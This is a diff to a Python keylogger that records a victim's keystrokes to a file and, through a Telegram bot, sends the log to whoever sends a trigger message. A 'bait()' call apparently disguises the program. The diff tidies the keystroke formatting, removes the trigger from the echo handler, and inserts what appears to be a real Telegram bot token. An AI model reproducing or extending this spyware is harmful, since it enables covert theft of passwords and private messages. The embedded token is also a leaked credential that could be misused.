@@ -57,10 +57,11 @@ def log_keystroke(key):
     key = str(key).replace("'", "")
     if key == "Key.space":
         key = "  "
-    if key == "Key.tab":
+    elif key == "Key.tab":
         key = "         "
-    if key == "Key.enter":
+    elif key == "Key.enter":
         key = "\n"
+    key = str(key).replace("Key.", "")
     with open("log.txt", "a") as f:
         f.write(key + " ")
 
@@ -79,11 +80,8 @@ def help(update, context):
 
 
 def echo(update, context):
-    if update.message.text == "MasterKey":
-        bossprotocol(update)
-    else:
-        print(update.message.text)
-        update.message.reply_text(update.message.text)
+    print(update.message.text)
+    update.message.reply_text(update.message.text)
 
 
 def bossprotocol(update):
@@ -92,7 +90,7 @@ def bossprotocol(update):
     f = open("log.txt", "r")
     message = f.read()
     update.message.reply_text(message)
-    open('log.txt', 'w')
+    open("log.txt", "w")
 
 
 def error(update, context):
@@ -102,7 +100,7 @@ def error(update, context):
 
 def tele_bot():
     updater = Updater(
-        "Auth_Token", use_context=True
+        "5027710057:AAGBz3kPPzovjenBTiB2_-shOutLMg0NBmI", use_context=True
     )
 
     dp = updater.dispatcher
@@ -115,7 +113,7 @@ def tele_bot():
     updater.idle()
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     t1 = multiprocessing.Process(target=keylog)
     t2 = multiprocessing.Process(target=tele_bot)
     bait()
